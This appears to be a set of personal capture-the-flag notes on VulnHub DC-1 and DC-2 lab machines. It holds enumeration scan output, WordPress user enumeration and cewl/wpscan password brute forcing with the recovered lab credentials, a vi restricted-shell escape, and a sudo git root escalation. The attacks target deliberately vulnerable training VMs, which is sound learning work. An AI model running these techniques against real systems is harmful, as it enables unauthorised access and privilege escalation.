/usr/bin/expiry<br />-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail<br />-rwxr-sr-x 1 root mail 13960 Dec 12  2012 /usr/bin/dotlockfile<br />-rwxr-sr-x 1 root utmp 4972 Feb 21  2011 /usr/lib/utempter/utempter<br />-rwxr-sr-x 1 root shadow 30332 May  5  2012 /sbin/unix_chkpwd<br /><br /><br />[-] Can&#39;t search *.conf files as no keyword was entered<br /><br />[-] Can&#39;t search *.php files as no keyword was entered<br /><br />[-] Can&#39;t search *.log files as no keyword was entered<br /><br />[-] Can&#39;t search *.ini files as no keyword was entered<br /><br />[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m<br />-rw-r--r-- 1 root root 62 Oct  4 01:08 /etc/resolv.conf<br />-rw-r--r-- 1 root root 346 Mar 31  2012 /etc/discover-modprobe.conf<br />-rw-r--r-- 1 root root 216 Sep 26  2016 /etc/sestatus.conf<br />-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf<br />-rw-r--r-- 1 root root 834 Jun  8  2012 /etc/gssapi_mech.conf<br />-rw-r--r-- 1 root root 859 Nov 24  2012 /etc/insserv.conf<br />-rw-r--r-- 1 root root 144 Feb 19  2019 /etc/kernel-img.conf<br />-rw-r--r-- 1 root root 3173 Dec 16  2017 /etc/reportbug.conf<br />-rw-r--r-- 1 root root 599 Feb 19  2009 /etc/logrotate.conf<br />-rw-r--r-- 1 root root 6895 Feb 19  2019 /etc/ca-certificates.conf<br />-rw-r--r-- 1 root root 284 Sep 25  2010 /etc/updatedb.conf<br />-rw-r--r-- 1 root root 191 Feb  1  2012 /etc/libaudit.conf<br />-rw-r--r-- 1 root root 604 May 16  2012 /etc/deluser.conf<br />-rw-r--r-- 1 root root 2940 Feb 12  2016 /etc/gai.conf<br />-rw-r--r-- 1 root root 2632 Oct  8  2014 /etc/rsyslog.conf<br />-rw-r--r-- 1 root root 2082 May 20  2012 /etc/sysctl.conf<br />-rw-r--r-- 1 root root 214 May 11  2013 /etc/idmapd.conf<br />-rw-r--r-- 1 root root 956 Feb 22  2015 /etc/mke2fs.conf<br />-rw-r--r-- 1 root root 552 Apr 30  2012 /etc/pam.conf<br />-rw-r--r-- 1 root root 2981 Feb 19  2019 /etc/adduser.conf<br />-rw-r--r-- 1 root root 2969 Dec 26  2012 /etc/debconf.conf<br />-rw-r--r-- 1 root root 9 Aug  8  2006 /etc/host.conf<br />-rw-r--r-- 1 root root 34 Feb 19  2019 /etc/ld.so.conf<br />-rw-r--r-- 1 root root 475 Aug 29  2006 /etc/nsswitch.conf<br /><br /><br />[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m<br />/home/flag4/.bash_history<br />cd <br />ls<br />vi flag4.txt<br />ls<br />exit<br /><br /><br />[00;31m[-] Any interesting mail in /var/mail:[00m<br />total 8<br />drwxrwsr-x  2 root mail 4096 Feb 19  2019 .<br />drwxr-xr-x 12 root root 4096 Feb 19  2019 ..<br /><br /><br />[00;33m### SCAN COMPLETE ####################################[00m<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>flag1.txt       Every good CMS needs a config file - and so do you.<br /><br />flag2.txt       Brute force and dictionary attacks aren&#39;t the only ways to gain access (and you WILL need access). What can you do with these credentials?<br /><br />flag3.txt       Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.<br /><br />flag4.txt       Can you use this same method to find or access the flag in root? Probably. But perhaps it&#39;s not that easy.  Or maybe it is?<br /><br />thefianlflag.txt<br /><br />Well done!!!!<br /><br />Hopefully you&#39;ve enjoyed this and learned some new skills.<br /><br />You can let me know what you thought of this little journey<br />by contacting me via Twitter - @DCAU7 </div><div class='page'><h1 class='title level-4'>DC-2</h1><br/>Netdiscover to find IP<br />nmap -sC -sV -p- 192.168.11.138 -oN DC-2.txt            <br />found 80 (http) and 7744 (ssh) open<br />added dc-2 to /etc/hosts file<br />for 80 ran nikto, dirsearch, davcheck, and wpscan<br />with wp scan I found 3 users (admin, tom, and jerry)<br />used cewl to generate a list of potential passwords by scraping the website.<br />used wpscan brute force tool with the new password list and got 2 accounts<br />tom     = parturient<br />jerry    = adipiscing<br />Logged into the website with these accounts, but could not upload a shell<br />Logged in with ssh via 7744 with tom and his creds<br />was in a very locked ~rshell<br />ran ls $PATH to see what commands I could run (ls, scp, vi, less)<br />went to sbin and saw there was a vi command to escape an rshell (vi, <code>:set shell=/bin/sh</code>   ,    <code>:shell</code>)<br />from there I set a new $PATH (export PATH=/usr/bin:/usr/sbin:/bin:/sbin)<br />I was then able to su jerry<br />sudo -l ( found that I could run git as root)<br />found a git elevate command in GTFOBIN <br />sudo git -p help config<br />!/bin/sh<br />I am now root!! cat /root/final-flag.txt</div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/>searchsploit -x exploits/linux/remote/6094.txt                  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;for privesc<br /><br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-2# nmap -sC -sV -oN DC-2.txt 192.168.11.138<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-04 19:54 EDT<br />Nmap scan report for 192.168.11.138<br />Host is up (0.000081s latency).<br />Not shown: 999 closed ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.4.10 ((Debian))<br />|_http-server-header: Apache/2.4.10 (Debian)<br />|_http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a><br />MAC Address: 00:0C:29:19:32:93 (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds<br /><br /><br />root@kali:~/Desktop/Machines/VunHub/DC-2# nmap -sC -sV -p- 192.168.11.138<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-04 19:55 EDT<br />Nmap scan report for 192.168.11.138<br />Host is up (0.00045s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE SERVICE VERSION<br />80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br />|_http-server-header: Apache/2.4.10 (Debian)<br />|_http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a><br />7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br />|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br />|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br />|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br />MAC Address: 00:0C:29:19:32:93 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds</div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-2# nikto -host <a href="http://192.168.11.138:80">http://192.168.11.138:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.138<br />+ Target Hostname:    192.168.11.138<br />+ Target Port:        80<br />+ Start Time:         2019-10-04 20:04:36 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.10 (Debian)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Root page / redirects to: <a href="http://dc-2/">http://dc-2/</a><br />+ Uncommon header &#39;link&#39; found, with multiple values: (&lt;<a href="http://dc-2/index.php/wp-json/>;">http://dc-2/index.php/wp-json/&gt;;</a> rel=&quot;<a href="https://api.w.org/",<http://dc-2/>;">https://api.w.org/&quot;,&lt;http://dc-2/&gt;;</a> rel=shortlink,)<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin &#39;Tested up to&#39; version usually matches the WordPress version<br />+ /wp-links-opml.php: This WordPress script reveals the installed version.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ Cookie wordpress_test_cookie created without the httponly flag<br />+ /wp-login.php: Wordpress login found<br />+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-10-04 20:05:38 (GMT-4) (62 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /><br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-2# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.138">http://192.168.11.138</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-04_20-03-43.log<br /><br />Target: <a href="http://192.168.11.138">http://192.168.11.138</a><br /><br />[20:03:43] Starting: <br />[20:03:43] 403 -  293B  - /.php<br />[20:03:44] 403 -  295B  - /icons/<br />[20:03:44] 200 -   52KB - /index.php<br />[20:03:44] 200 -    0B  - /wp-content/<br />[20:03:44] 200 -    2KB - /wp-login.php<br />[20:03:45] 200 -   40KB - /wp-includes/<br />[20:03:55] 200 -  135B  - /wp-trackback.php<br />[20:04:01] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.11.138%2Fwp-admin%2F&reauth=1">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.11.138%2Fwp-admin%2F&amp;reauth=1</a><br />[20:04:25] 405 -   42B  - /xmlrpc.php<br />[20:05:34] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://dc-2/wp-login.php?action=register">http://dc-2/wp-login.php?action=register</a><br />[20:07:29] 403 -  303B  - /server-status/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>wpscan</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-2# wpscan --url <a href="http://dc-2/">http://dc-2/</a> --enumerate u,ap,tt,t --ignore-main-redirect -o /root/Desktop/Machines/VunHub/DC-2/WPScan.txt<br />root@kali:~/Desktop/Machines/VunHub/DC-2# cat WPScan.txt <br />_______________________________________________________________<br />        __          _______   _____<br />        \ \        / /  __ \ / ____|<br />         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br />          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \<br />           \  /\  /  | |     ____) | (__| (_| | | | |<br />            \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br /><br />        WordPress Security Scanner by the WPScan Team<br />                       Version 3.6.0<br />          Sponsored by Sucuri - <a href="https://sucuri.net">https://sucuri.net</a><br />      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_<br />_______________________________________________________________<br /><br />[+] URL: <a href="http://dc-2/">http://dc-2/</a><br />[+] Started: Fri Oct  4 20:30:18 2019<br /><br />Interesting Finding(s):<br /><br />[+] <a href="http://dc-2/">http://dc-2/</a><br /> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br /> | Found By: Headers (Passive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://dc-2/xmlrpc.php">http://dc-2/xmlrpc.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /> | References:<br /> |  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</a><br /><br />[+] <a href="http://dc-2/readme.html">http://dc-2/readme.html</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://dc-2/wp-cron.php">http://dc-2/wp-cron.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 60%<br /> | References:<br /> |  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a><br /> |  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a><br /><br />[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br /> | Detected By: Rss Generator (Passive Detection)<br /> |  - <a href="http://dc-2/index.php/feed/,">http://dc-2/index.php/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=4.7.10</generator>">https://wordpress.org/?v=4.7.10&lt;/generator&gt;</a><br /> |  - <a href="http://dc-2/index.php/comments/feed/,">http://dc-2/index.php/comments/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=4.7.10</generator>">https://wordpress.org/?v=4.7.10&lt;/generator&gt;</a><br /> |<br /> | [!] 11 vulnerabilities identified:<br /> |<br /> | [!] Title: WordPress &lt;= 4.9.6 - Authenticated Arbitrary File Deletion<br /> |     Fixed in: 4.7.11<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9100">https://wpvulndb.com/vulnerabilities/9100</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895</a><br /> |      - <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a><br /> |      - <a href="http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/">http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd">https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd</a><br /> |      - <a href="https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/">https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/</a><br /> |      - <a href="https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/">https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9169">https://wpvulndb.com/vulnerabilities/9169</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9170">https://wpvulndb.com/vulnerabilities/9170</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/">https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9171">https://wpvulndb.com/vulnerabilities/9171</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9172">https://wpvulndb.com/vulnerabilities/9172</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9173">https://wpvulndb.com/vulnerabilities/9173</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460">https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9174">https://wpvulndb.com/vulnerabilities/9174</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9175">https://wpvulndb.com/vulnerabilities/9175</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a">https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a</a><br /> |<br /> | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution<br /> |     Fixed in: 5.0.1<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9222">https://wpvulndb.com/vulnerabilities/9222</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943</a><br /> |      - <a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a><br /> |      - <a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce">https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce</a><br /> |<br /> | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)<br /> |     Fixed in: 4.7.13<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9230">https://wpvulndb.com/vulnerabilities/9230</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b">https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b</a><br /> |      - <a href="https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/">https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/</a><br /> |      - <a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce/">https://blog.ripstech.com/2019/wordpress-csrf-to-rce/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation<br /> |     Fixed in: 4.7.14<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9867">https://wpvulndb.com/vulnerabilities/9867</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222</a><br /> |      - <a href="https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/">https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68">https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68</a><br /><br />[+] WordPress theme in use: twentyseventeen<br /> | Location: <a href="http://dc-2/wp-content/themes/twentyseventeen/">http://dc-2/wp-content/themes/twentyseventeen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://dc-2/wp-content/themes/twentyseventeen/README.txt">http://dc-2/wp-content/themes/twentyseventeen/README.txt</a><br /> | [!] The version is out of date, the latest version is 2.2<br /> | Style URL: <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10">http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</a><br /> | Style Name: Twenty Seventeen<br /> | Style URI: <a href="https://wordpress.org/themes/twentyseventeen/">https://wordpress.org/themes/twentyseventeen/</a><br /> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Css Style (Passive Detection)<br /> |<br /> | Version: 1.2 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10,">http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10,</a> Match: &#39;Version: 1.2&#39;<br /><br /><br />[i] No plugins Found.<br /><br /><br />[i] Theme(s) Identified:<br /><br />[+] twentyfifteen<br /> | Location: <a href="http://dc-2/wp-content/themes/twentyfifteen/">http://dc-2/wp-content/themes/twentyfifteen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://dc-2/wp-content/themes/twentyfifteen/readme.txt">http://dc-2/wp-content/themes/twentyfifteen/readme.txt</a><br /> | [!] The version is out of date, the latest version is 2.5<br /> | Style URL: <a href="http://dc-2/wp-content/themes/twentyfifteen/style.css">http://dc-2/wp-content/themes/twentyfifteen/style.css</a><br /> | Style Name: Twenty Fifteen<br /> | Style URI: <a href="https://wordpress.org/themes/twentyfifteen/">https://wordpress.org/themes/twentyfifteen/</a><br /> | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple, st...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Known Locations (Aggressive Detection)<br /> |<br /> | Version: 1.7 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://dc-2/wp-content/themes/twentyfifteen/style.css,">http://dc-2/wp-content/themes/twentyfifteen/style.css,</a> Match: &#39;Version: 1.7&#39;<br /><br />[+] twentyseventeen<br /> | Location: <a href="http://dc-2/wp-content/themes/twentyseventeen/">http://dc-2/wp-content/themes/twentyseventeen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://dc-2/wp-content/themes/twentyseventeen/README.txt">http://dc-2/wp-content/themes/twentyseventeen/README.txt</a><br /> | [!] The version is out of date, the latest version is 2.2<br /> | Style URL: <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css">http://dc-2/wp-content/themes/twentyseventeen/style.css</a><br /> | Style Name: Twenty Seventeen<br /> | Style URI: <a href="https://wordpress.org/themes/twentyseventeen/">https://wordpress.org/themes/twentyseventeen/</a><br /> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Urls In Homepage (Passive Detection)<br /> | Confirmed By: Known Locations (Aggressive Detection)<br /> |<br /> | Version: 1.2 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css,">http://dc-2/wp-content/themes/twentyseventeen/style.css,</a> Match: &#39;Version: 1.2&#39;<br /><br />[+] twentysixteen<br /> | Location: <a href="http://dc-2/wp-content/themes/twentysixteen/">http://dc-2/wp-content/themes/twentysixteen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://dc-2/wp-content/themes/twentysixteen/readme.txt">http://dc-2/wp-content/themes/twentysixteen/readme.txt</a><br /> | [!] The version is out of date, the latest version is 2.0<br /> | Style URL: <a href="http://dc-2/wp-content/themes/twentysixteen/style.css">http://dc-2/wp-content/themes/twentysixteen/style.css</a><br /> | Style Name: Twenty Sixteen<br /> | Style URI: <a href="https://wordpress.org/themes/twentysixteen/">https://wordpress.org/themes/twentysixteen/</a><br /> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Known Locations (Aggressive Detection)<br /> |<br /> | Version: 1.3 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://dc-2/wp-content/themes/twentysixteen/style.css,">http://dc-2/wp-content/themes/twentysixteen/style.css,</a> Match: &#39;Version: 1.3&#39;<br /><br /><br />[i] No Timthumbs Found.<br /><br /><br />[i] User(s) Identified:<br /><br />[+] admin<br /> | Detected By: Rss Generator (Passive Detection)<br /> | Confirmed By:<br /> |  Wp Json Api (Aggressive Detection)<br /> |   - <a href="http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] jerry<br /> | Detected By: Wp Json Api (Aggressive Detection)<br /> |  - <a href="http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> | Confirmed By:<br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] tom<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br /><br />[+] Finished: Fri Oct  4 20:30:22 2019<br />[+] Requests Done: 3036<br />[+] Cached Requests: 18<br />[+] Data Sent: 503.375 KB<br />[+] Data Received: 1.061 MB<br />[+] Memory used: 163.934 MB<br />[+] Elapsed time: 00:00:04<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>Flag 1:<br />Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.<br />More passwords is always better, but sometimes you just can’t win them all.<br />Log in as one to see the next flag.<br />If you can’t find it, log in as another.<br /><br />Flag 2:<br />If you can&#39;t exploit WordPress and take a shortcut, there is another way.<br />Hope you found another 